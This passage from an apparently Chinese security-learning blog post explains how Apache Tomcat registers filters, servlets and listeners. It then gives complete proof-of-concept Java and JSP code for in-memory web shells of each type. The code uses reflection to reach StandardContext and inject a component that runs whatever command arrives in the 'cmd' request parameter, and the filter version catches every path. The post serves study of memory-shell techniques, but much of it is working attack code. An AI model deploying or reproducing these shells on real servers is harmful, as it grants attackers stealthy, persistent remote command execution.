+<p>现在我们只是获取到了filterConfigs，而要想真正创建一个filter放到filterchain中必须满足两个条件：<br>一是我们要有相关的filterconfigs，能够从filterconfig中获取相关配置信息，创建一个filter<br>二是我们在filterMaps必须要有&lt;路由,filter&gt;这个键值对，访问的到才能让程序知道有这个filter<br>所以接下来的工作就是创建这两个东西<br>filterMaps的很好解决，一个class和String URL就能解决<br>主要是filterConfigs，他是一个map键值对变量，键是filter名，值是ApplicationFilterConfig，而applicationFilterConfig的创建又需要filterDef,所以在创建filterConfigs时的思路就是先把filterDefs创建好，之后再把applicationFilterConfig创建好，然后再构造filterConfigs即可</p>
+<p>filterDefs创建如下</p>
+<pre><code class="java">//反射获取filterDef，设置filter名等参数
+Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);  
+Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
+FilterDef o = (FilterDef) declaredConstructors.newInstance();
+
+
+//将filter的类和名都要放进去，然后再调用addfilterDef将我们刚才构建好的filterDef添加  
+o.setFilter(filter);  
+o.setFilterName(FilterName);  
+o.setFilterClass(filter.getClass().getName());  
+//肯定也要存入standardcontext的filterDefs
+standardContext.addFilterDef(o);
+</code></pre>
+<p>然后是FilterMap</p>
+<pre><code class="java">//反射获取FilterMap,设置URL(到时候要访问的拦截路径),调用addfilterBefore将我们的filter设置成第一个拦截  
+Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);  
+Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();  
+org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap) declaredConstructor.newInstance();  
+  
+o1.addURLPattern(&quot;/*&quot;);  
+o1.setFilterName(FilterName);  
+o1.setDispatcher(DispatcherType.REQUEST.name());  
+standardContext.addFilterMapBefore(o1);
+</code></pre>
+<p>最后是filterConfigs</p>
+<pre><code class="java">
+//反射获取ApplicationFilterConfig,在构造的时候传入我们的filterDef
+Class&lt;?&gt; applicationfilterconfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);  
+Constructor&lt;?&gt; declaredConstructor1 = applicationfilterconfig.getDeclaredConstructor();  
+declaredConstructor1.setAccessible(true);  
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext, o);  
+filterConfigs.put(FilterName, filterConfig);  
+response.getWriter().write(&quot;Sucess&quot;);
+</code></pre>
+<p>这里o是紧接着我们上面提前构造的好的filterDef</p>
+<p>整体POC如下</p>
+<pre><code class="java">import jakarta.servlet.annotation.WebServlet;  
+import org.apache.catalina.Context;  
+import org.apache.catalina.core.ApplicationContext;  
+import org.apache.catalina.core.ApplicationFilterConfig;  
+import org.apache.catalina.core.StandardContext;  
+import org.apache.tomcat.util.descriptor.web.FilterDef;  
+import org.apache.tomcat.util.descriptor.web.FilterMap;  
+  
+import javax.servlet.*;  
+import javax.servlet.http.HttpServlet;  
+import javax.servlet.http.HttpServletRequest;  
+import javax.servlet.http.HttpServletResponse;  
+import java.io.IOException;  
+import java.io.InputStream;  
+import java.lang.reflect.Constructor;  
+import java.lang.reflect.Field;  
+import java.util.Map;  
+import java.util.Scanner;  
+  
+@WebServlet(name = &quot;Filtershell&quot;, value = &quot;/filter-shell&quot;)  
+public class Filtershell extends HttpServlet &#123;  
+protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  
+//Field Configs = null;  
+Map filterConfigs;  
+try &#123;  
+//反射获取standardContext  
+ServletContext servletContext = request.getSession().getServletContext();  
+Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);  
+appctx.setAccessible(true);  
+ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);  
+  
+Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);  
+stdctx.setAccessible(true);  
+StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);  
+  
+//获取到standardcontext中的filterConfigs  
+String FilterName = &quot;cmd_Filter&quot;;  
+Field configs = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);  
+configs.setAccessible(true);  
+filterConfigs = (Map) configs.get(standardContext);  
+  
+//因为可能访问这个路由不止一次,循环写马没必要了,if判断一下就行  
+if (filterConfigs.get(FilterName) == null) &#123;  
+Filter filter = new Filter() &#123;  
+@Override  
+public void init(FilterConfig filterConfig) throws ServletException &#123;  
+&#125;  
+  
+@Override  
+public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;  
+HttpServletRequest req = (HttpServletRequest) servletRequest;  
+if (req.getParameter(&quot;cmd&quot;) != null)&#123;  
+  
+InputStream in = Runtime.getRuntime().exec(req.getParameter(&quot;cmd&quot;)).getInputStream();  
+//  
+Scanner s = new Scanner(in).useDelimiter(&quot;\\A&quot;);  
+String output = s.hasNext() ? s.next() : &quot;&quot;;  
+servletResponse.getWriter().write(output);  
+  
+return; &#125;  
+filterChain.doFilter(servletRequest,servletResponse);  
+&#125;  
+  
+@Override  
+public void destroy() &#123;  
+&#125;  
+&#125;;  
+  
+//反射获取filterDef，设置filter名等参数  
+Class&lt;?&gt; FilterDef = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;);  
+Constructor declaredConstructors = FilterDef.getDeclaredConstructor();  
+FilterDef o = (FilterDef) declaredConstructors.newInstance();  
+  
+//将filter的类和名都要放进去，然后再调用addfilterDef将我们刚才构建好的filterDef添加  
+o.setFilter(filter);  
+o.setFilterName(FilterName);  
+o.setFilterClass(filter.getClass().getName());  
+standardContext.addFilterDef(o);  
+  
+//反射获取FilterMap,设置URL(到时候要访问的拦截路径),调用addfilterBefore将我们的filter设置成第一个拦截  
+Class&lt;?&gt; FilterMap = Class.forName(&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;);  
+Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();  
+org.apache.tomcat.util.descriptor.web.FilterMap o1 = (FilterMap) declaredConstructor.newInstance();  
+  
+o1.addURLPattern(&quot;/*&quot;);  
+o1.setFilterName(FilterName);  
+o1.setDispatcher(DispatcherType.REQUEST.name());  
+standardContext.addFilterMapBefore(o1);  
+  
+//反射获取ApplicationFilterConfig,在构造的时候传入我们的filterDef  
+Class&lt;?&gt; applicationfilterconfig = Class.forName(&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;);  
+Constructor&lt;?&gt; declaredConstructor1 = applicationfilterconfig.getDeclaredConstructor(Context.class,FilterDef.class);  
+declaredConstructor1.setAccessible(true);  
+ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext, o);  
+filterConfigs.put(FilterName, filterConfig);  
+response.getWriter().write(&quot;filteradd&quot;);  
+  
+&#125;  
+&#125; catch (Exception e) &#123;  
+throw new RuntimeException(e);  
+&#125;  
+  
+  
+&#125;  
+  
+protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;  
+this.doPost(request, response);  
+&#125;  
+  
+&#125;
+</code></pre>
+<p>我们实验一下<br>首先访问生成恶意filter的路由&#x2F;filtershell，提示filter已经add进去了<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/24.png"><br>然后filterMaps里面我们设置的filter路由是&#x2F;*，也就是所有路径<br>这个时候我们任意访问之前写过的路由，然后加上?cmd&#x3D;calc的参数<br>这里用idea专业版生成Tomcat项目会自带一个hello-servlet路由，我们就拿它来演示<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/25.png"><br>写入成功<br>稍微总结一下filter型内存马的内容：<br><strong>总的过程是如何植入新的filter</strong><br>想要植入新的filter，我们分析出来的方法是在filterchain创建的过程中植入 也就是createFilterchain这个方法<br>他会根据<strong>filterConfig</strong>来生成新filter，然后根据<strong>filterMap</strong>来建立路由与filter的关系，也就是访问哪些路由能够经过这个filter<br>所以我们接下来就是创建号filterConfig和filterMap<br>filterMap简单，把我们的filter实例和路由传进去即可<br>filterConfig分为applicationFilterConfig与filterDef组成键值对 所以任务就是创建好applicationFilterConfig与filterDef即可</p>
+<h2 id="servlet型内存马"><a href="#servlet型内存马" class="headerlink" title="servlet型内存马"></a>servlet型内存马</h2><p>注意这里的servlet和httpservlet有所区别<br>依然还是要了解如何添加新的servlet流程，我们可以看看servletcontext的实现类–ApplicationContext，他里面有关于新servlet的生成方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/26.png"></p>
+<p>这里还是看看su18佬的源码图片，我自己的不是很清晰<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/27.png"><br>其实跟我们之前看的addfilter的内容是差不多逻辑的<br>先判断我们的要创建的servletName是否为空，然后判断应用程序状态<br>然后也是在context中查找是否已经有了该servlet，如果有就直接调，如果没有就创建一个wrapper放入child，这里跟addfilter的创建一个filterDef的内容很像</p>
+<p>那其实就很自然的想到它是如何加载到我们的servlet以及如何定位到servlet的</p>
+<p>ApplicationServletRegistration的addMapping方法依然调用了standardContext中的方法—addServletMapping，这个mapping的键值对是URL路径和Wrapper对象<br>同时也在servletMappings中添加URL路径和name的映射</p>
+<h3 id="Servlet创建流程"><a href="#Servlet创建流程" class="headerlink" title="Servlet创建流程"></a>Servlet创建流程</h3><p>现在本地来测试一下Servlet的过程，首先先写一个测试servlet </p>
+<pre><code class="java">import javax.servlet.*;  
+import javax.servlet.annotation.WebServlet;  
+import java.io.IOException;  
+  
+// 基础恶意类  
+public class ServletTest implements Servlet &#123;  
+@Override  
+public void init(ServletConfig config) throws ServletException &#123;  
+  
+&#125;  
+  
+@Override  
+public ServletConfig getServletConfig() &#123;  
+return null;  
+&#125;  
+  
+@Override  
+public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException &#123;  
+String cmd = req.getParameter(&quot;cmd&quot;);  
+if (cmd != null) &#123;  
+try &#123;  
+Runtime.getRuntime().exec(cmd);  
+&#125; catch (IOException e) &#123;  
+e.printStackTrace();  
+&#125; catch (NullPointerException n) &#123;  
+n.printStackTrace();  
+&#125;  
+&#125;  
+&#125;  
+  
+@Override  
+public String getServletInfo() &#123;  
+return null;  
+&#125;  
+  
+@Override  
+public void destroy() &#123;  
+  
+&#125;  
+&#125;
+</code></pre>
+<p>web.xml也配置一下</p>
+<pre><code class="xml">&lt;servlet&gt;  
+&lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;  
+&lt;servlet-class&gt;com.example.servletdemo.ServletTest&lt;/servlet-class&gt;  
+&lt;/servlet&gt;  
+&lt;servlet-mapping&gt;  
+&lt;servlet-name&gt;ServletTest&lt;/servlet-name&gt;  
+&lt;url-pattern&gt;/ServletTest&lt;/url-pattern&gt;  
+&lt;/servlet-mapping&gt;
+</code></pre>
+<p>然后我们把断点打在init方法，开启tomcat服务之后路由访问ServletTest</p>
+<p>发现前面已经经过了很多流程<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/28.png"></p>
+<p>之前的tomcat基础应该还有印象，发现了几个熟悉的字样 EndPoint Processor Adapter，跟我们的tomcat与外界交互的流程是一样的<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/29.png"><br>上面这段流程其实跟我们这次分析servlet怎么最终通过web.xml来获取配置信息加载联系不是很大，这里就不跟进之前的流程了，总结一下就是获取到外部的请求信息包之后解析，然后将其转化为request对象，在通过adpter转化为servletrequest对象传给container容器进行处理（里面包含我们的filter listener servlet)</p>
+<p>我们移动到读取web.xml配置信息加载servlet的流程开始 <strong>ContextConfig.configureContext()</strong><br>直接来到configureContext方法关于servlet创建的地方<br>这里是首先调用createWrapper，因为在tomcat中servlet是必须用wrapper包起来的，所以想要创建一个servlet，就必须先创建一个wrapper</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/30.png"><br>还注意到调用的context的createWrapper，也就是standardContext，不论是filter还是listener和servlet，我们想要创建一个新的，就必须和stanardContext打交道，他也是整个tomcat三大件创建的相关核心类<br>我们在这里下个断点调试一下</p>
+<p>运行tomcat，他会断在这里，现在加载的是他自带的一些servlet，就拿这个默认的举例，下一步就是将这个servlet的name放到wrapper里面<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/31.png"></p>
+<p>然后开始获取webxml中的内容，将指定的servlet类的全类名放进去<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/32.png"></p>
+<p>现在的wrapper建立载入了servletname和指定加载的全类名之后，被add到了standardcontext中<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/33.png"><br>其实上述过程就是在读取web.xml中的信息的过程<br>根据servlet的结构来一步一步加载进去<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/34.png"><br>servletmapping的加载则是在后面<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/35.png"></p>
+<p>到这里其实servlet的注册已经完毕了，我们总结一下servlet动态创建的条件</p>
+<ul>
+<li>通过context.createWrapper()方法创建wrapper对象</li>
+<li>设置servlet的name属性</li>
+<li>设置servlet的全类名</li>
+<li>设置servletmapping，也就是url路径和servlet对应关系</li>
+<li>然后将装载了servlet信息的wrapper通过addchild方法添加到context中</li>
+</ul>
+<p>经历过这些进程之后就算是注册完毕了，但是还没有实例化servlet，这个只能等我们去访问路径的时候才会实例化这个servlet，这也被称为servlet的懒加载机制，这个机制的主要方法loadOnStartup()实关于属性值loadOnStartUp的设置，当我们的这个属性值大于等于0时，表示我们这个容器现在正在被访问，需要加载servlet，正数值越小，启动的优先级越高</p>
+<h3 id="Servlet内存马编写"><a href="#Servlet内存马编写" class="headerlink" title="Servlet内存马编写"></a>Servlet内存马编写</h3><p>收束一下前文的关系，我们跟进了正式访问servlet之前的流程，也就是connector的工作。<br>然后直接来到了通过web.xml注册servlet的地方，了解到了servlet的几个注册条件，主要是创建了一个wrapper包含了我们servlet的该有的信息把他放到了standardContext中</p>
+<p>所以接下来的工作：<br>创建好带有恶意servlet信息的wrapper，然后将其add到standardContext的child中<br>然后设置好servlet与路由的mapping</p>
+<h4 id="java实现"><a href="#java实现" class="headerlink" title=".java实现"></a>.java实现</h4><pre><code class="java">import org.apache.catalina.Wrapper;  
+import org.apache.catalina.connector.Request;  
+import org.apache.catalina.core.StandardContext;  
+  
+
+import javax.servlet.*;  
+import javax.servlet.http.HttpServletRequest;  
+import javax.servlet.http.HttpServletResponse;  
+import java.io.IOException;  
+import java.lang.reflect.Field;  
+  
+public class Evilservlet implements Servlet &#123;  
+@Override  
+public void init(ServletConfig servletConfig) throws ServletException &#123;  
+  
+&#125;  
+  
+@Override  
+public ServletConfig getServletConfig() &#123;  
+return null;  
+&#125;  
+  
+@Override  
+public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;  
+
+//这里两个try是为了得到standardcontext
+Field reqF = null;  
+try &#123;  
+reqF = servletRequest.getClass().getDeclaredField(&quot;request&quot;);  
+&#125; catch (NoSuchFieldException e) &#123;  
+e.printStackTrace();  
+&#125;  
+reqF.setAccessible(true);  
+Request req = null;  
+try &#123;  
+req = (Request) reqF.get(servletRequest);  
+&#125; catch (IllegalAccessException e) &#123;  
+e.printStackTrace();  
+&#125;  
+StandardContext standardContext = (StandardContext) req.getContext();  
+
+//将我们的Evilservlet恶意servlet的配置信息 全类名以及名字 URL对应都配置进wrappper
+//调用standardcontext的addchild将刚才配置好的wrapper存入
+Evilservlet servletShell = new Evilservlet();  
+String name = servletShell.getClass().getSimpleName();  
+  
+Wrapper wrapper = standardContext.createWrapper();  
+wrapper.setLoadOnStartup(1);  
+wrapper.setName(name);  
+wrapper.setServlet(servletShell);  
+wrapper.setServletClass(servletShell.getClass().getName());  
+standardContext.addChild(wrapper);  
+standardContext.addServletMappingDecoded(&quot;/shell&quot;,name);  
+  
+String cmd = servletRequest.getParameter(&quot;cmd&quot;);  
+if (cmd !=null)&#123;  
+try&#123;  
+Runtime.getRuntime().exec(cmd);  
+&#125;catch (IOException e)&#123;  
+e.printStackTrace();  
+&#125;catch (NullPointerException n)&#123;  
+n.printStackTrace();  
+&#125;  
+&#125;  
+&#125;  
+  
+@Override  
+public String getServletInfo() &#123;  
+return null;  
+&#125;  
+  
+@Override  
+
+public void destroy() &#123;  
+  
+&#125;  
+  
+public synchronized HttpServletResponse getResponseFromRequest(HttpServletRequest var1) &#123;  
+HttpServletResponse var2 = null;  
+  
+try &#123;  
+Field var3 = var1.getClass().getDeclaredField(&quot;response&quot;);  
+var3.setAccessible(true);  
+var2 = (HttpServletResponse)var3.get(var1);  
+&#125; catch (Exception var8) &#123;  
+try &#123;  
+Field var4 = var1.getClass().getDeclaredField(&quot;request&quot;);  
+var4.setAccessible(true);  
+Object var5 = var4.get(var1);  
+Field var6 = var5.getClass().getDeclaredField(&quot;response&quot;);  
+var6.setAccessible(true);  
+var2 = (HttpServletResponse)var6.get(var5);  
+&#125; catch (Exception var7) &#123;  
+&#125;  
+&#125;  
+  
+return var2;  
+&#125;  
+&#125;
+</code></pre>
+<p>这个版本的poc版本高了好像会报500的错，这里不是很推荐，只用于理解servlet写马的整体思路</p>
+<p>接下来写JSP形式的</p>
+<h4 id="jsp实现"><a href="#jsp实现" class="headerlink" title=".jsp实现"></a>.jsp实现</h4><pre><code class="java">
+&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;  
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;  
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;  
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;  
+&lt;%@ page import=&quot;org.apache.catalina.Wrapper&quot; %&gt;&lt;%--  
+Created by IntelliJ IDEA.  
+User: stoocea  
+Date: 2023/11/22  
+Time: 19:46  
+To change this template use File | Settings | File Templates.  
+--%&gt;  
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;  
+&lt;html&gt;  
+&lt;head&gt;  
+&lt;title&gt;Title&lt;/title&gt;  
+&lt;/head&gt;  
+&lt;body&gt;  
+&lt;%--首先获取到standContext对象 --%&gt;&lt;%  
+Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);  
+reqF.setAccessible(true);  
+Request req = (Request) reqF.get(request);  
+StandardContext standardContext = (StandardContext) req.getContext();  
+%&gt;  
+  
+&lt;%--编写恶意servlet--%&gt;  
+&lt;%!  
+public class Shell_Servlet implements Servlet &#123;  
+@Override  
+public void init(ServletConfig servletConfig) throws ServletException &#123;  
+  
+&#125;  
+  
+@Override  
+public ServletConfig getServletConfig() &#123;  
+return null;  
+&#125;  
+  
+@Override  
+public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException &#123;  
+String cmd= servletRequest.getParameter(&quot;cmd&quot;);  
+if(cmd!=null)&#123;  
+try&#123;
+Runtime.getRuntime().exec(cmd);  
+  
+&#125; catch (IOException e) &#123;  
+throw new RuntimeException(e);  
+&#125;  
+&#125;  
+&#125;  
+  
+@Override  
+public String getServletInfo() &#123;  
+return null;  
+&#125;  
+  
+@Override  
+public void destroy() &#123;  
+  
+&#125;  
+&#125;  
+%&gt;  
+  
+&lt;%--创建wrapper对象 装载恶意servlet对象的配置信息--%&gt;  
+&lt;%  
+Shell_Servlet shellServlet=new Shell_Servlet();  
+String name=shellServlet.getClass().getSimpleName();  
+Wrapper wrapper=standardContext.createWrapper();  
+wrapper.setName(name);  
+wrapper.setServlet(shellServlet);  
+wrapper.setServletClass(shellServlet.getClass().getName());  
+  
+%&gt;  
+  
+&lt;%--将wrapper添加进standardContext，并设置mapping-路由与servlet的键值对--%&gt;  
+&lt;%  
+standardContext.addChild(wrapper);  
+standardContext.addServletMappingDecoded(&quot;/servletshell&quot;,name);  
+  
+%&gt;  
+&lt;/body&gt;  
+&lt;/html&gt;
+
+</code></pre>
+<p>整体的思路跟着注释<br>先访问evilservlet.jsp文件生成内存马<br>然后访问我们的指定路由就行</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/36.png"></p>
+<h2 id="listener型内存马"><a href="#listener型内存马" class="headerlink" title="listener型内存马"></a>listener型内存马</h2><p>首先回顾一下什么是listener？<br>在java web的开发过程中，listener其实总结起来就是Application、Session 和 Request 三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。<br>再说直白一点就是可以用监听器听客户端的请求，以及服务端的操作，然后也能够代码执行</p>
+<p>关于Listener监听作用实现的三个对象 </p>
+<ul>
+<li>ServletContextListener</li>
+<li>HttpSessionListener</li>
+<li>ServletRequestListener</li>
+</ul>
+<p>其实体验下来，listener是最适合做内存马的，之后再说具体原因</p>
+<h3 id="Listener基础代码实现以及流程分析"><a href="#Listener基础代码实现以及流程分析" class="headerlink" title="Listener基础代码实现以及流程分析"></a>Listener基础代码实现以及流程分析</h3><h4 id="基础代码实现"><a href="#基础代码实现" class="headerlink" title="基础代码实现"></a>基础代码实现</h4><p>想要实现Listener的功能，就必须实现EventListener这个接口<br>综合他的实现类来看，跟我们tomcat服务器关系紧密，且很容易实现的类，我们可以采用<code>ServletRequestListener</code> 这个类来写马<br>我们看到这个类的定义内容</p>
+<p>有一段方法非常引人瞩目，如下<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/37.png"></p>
+<p>根据定义，其实他监控了所有请求的生成，也就是我们往对应路径发送请求时，对应的listener就会触发这个方法</p>
+<p>这里我们自己创建一个Listener，设定访问路径以及web.xml</p>
+<pre><code class="java">import javax.servlet.ServletRequestEvent;  
+import javax.servlet.ServletRequestListener;  
+import javax.servlet.annotation.WebListener;  
+  
+@WebListener(&quot;/listenerTest&quot;)  
+public class ListenerTest implements ServletRequestListener &#123;  
+  
+@Override  
+public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;  
+  
+&#125;  
+  
+@Override  
+public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;  
+System.out.println(&quot;Listener 被调用&quot;);  
+&#125;  
+&#125;
+</code></pre>
+<pre><code class="xml">&lt;listener&gt;  
+&lt;listener-class&gt;ListenerTest&lt;/listener-class&gt;  
+&lt;/listener&gt;
+</code></pre>
+<p>只要我们访问对应路径就会触发requestInitialized方法<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/38.png"></p>
+<h4 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h4><p>listener的配置信息都是通过web.xml读取的，所以我们要去找实现了读取web.xml文件内容的类与方法<br>在ContextConfig类下的configureContext方法(<br>其实不只是listener,我们之前分析的filter和servlet都要通过web.xml的内容去配置<br>configureContext这个方法都一一实现了)</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/39.png"><br>发现读取完之后会调用standContext的<code>addApplicationListener()</code></p>
+<p>我们继续跟进</p>
+<p>发现这里并没有实质性的添加listener,它只是将这个Listener的类名添加进了Application<br><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/40.png"><br>实际上,真正添加进有效listener的方法是之后standardContext的addApplicationEventListener方法</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/41.png"><br>你会发现它只有一个参数,而且就是我们的listener实体<br>那其实我们自己构造的listener内存马实现条件就很容易实现了,写一个恶意Listener类,之后实例化后直接调用addApplicationEventListener即可<br>POC如下</p>
+<pre><code class="jsp">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;  
+&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;  
+&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;  
+&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;&lt;%--  
+Created by IntelliJ IDEA.  
+User: ASUS  
+Date: 2023/11/23  
+Time: 12:02  
+To change this template use File | Settings | File Templates.  
+--%&gt;  
+&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;  
+&lt;html&gt;  
+&lt;head&gt;  
+&lt;title&gt;Title&lt;/title&gt;  
+&lt;/head&gt;  
+&lt;body&gt;  
+&lt;%--获取到standardContext--%&gt;  
+&lt;%  
+Field reqF=request.getClass().getDeclaredField(&quot;request&quot;);  
+reqF.setAccessible(true);  
+Request req=(Request) reqF.get(request);  
+StandardContext context =(StandardContext) req.getContext();  
+%&gt;  
+  
+&lt;%--撰写恶意类--%&gt;  
+&lt;%!  
+public class Shell_Listener implements ServletRequestListener&#123;  
+@Override  
+public void requestDestroyed(ServletRequestEvent servletRequestEvent) &#123;  
+  
+&#125;  
+  
+@Override  
+public void requestInitialized(ServletRequestEvent servletRequestEvent) &#123;  
+HttpServletRequest request=(HttpServletRequest) servletRequestEvent.getServletRequest();  
+String cmd=request.getParameter(&quot;cmd&quot;);  
+if(cmd!=null)&#123;  
+try&#123;  
+Runtime.getRuntime().exec(cmd);  
+&#125;catch (IOException e)&#123;  
+e.printStackTrace();  
+&#125;  
+&#125;  
+&#125;  
+&#125;  
+  
+%&gt;  
+  
+&lt;%--最后调用addApplicationEventListener，添加我们的恶意listener--%&gt;  
+&lt;%  
+  
+Shell_Listener shell_listener=new Shell_Listener();  
+context.addApplicationEventListener(shell_listener);  
+  
+%&gt;
+</code></pre>
+<p>访问JSP文件后,之后任意请求都能触发监听器了</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://stoocea.github.io/images/memshell-tomcat-img/42.png"></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> tomcat内存马学习（未完全）</li>
+        <li><strong>作者:</strong> stoocea</li>
+        <li><strong>创建于
+                :</strong> 2023-11-23 17:50:51</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2023-11-23 16:44:05
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com//post/内存马-tomcat类全类型测试学习.html
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/post/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">FastJson反序列化学习</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail']
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">tomcat内存马学习（未完全）</div>
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95%E5%89%8D%E7%9A%84%E5%B0%8F%E8%A1%A5%E5%85%85"><span class="nav-text">测试前的小补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Filter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">Filter型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#FIlter%E6%B3%A8%E5%86%8C%E6%96%B9%E5%BC%8F"><span class="nav-text">FIlter注册方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filter%E6%B3%A8%E5%86%8C%E6%8E%A2%E7%B4%A2"><span class="nav-text">filter注册探索</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E5%89%8D%E7%9A%84%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="nav-text">实现前的流程分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-text">攻击流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#servlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">servlet型内存马</span></a><ol class="nav-child"><li class="nav-item 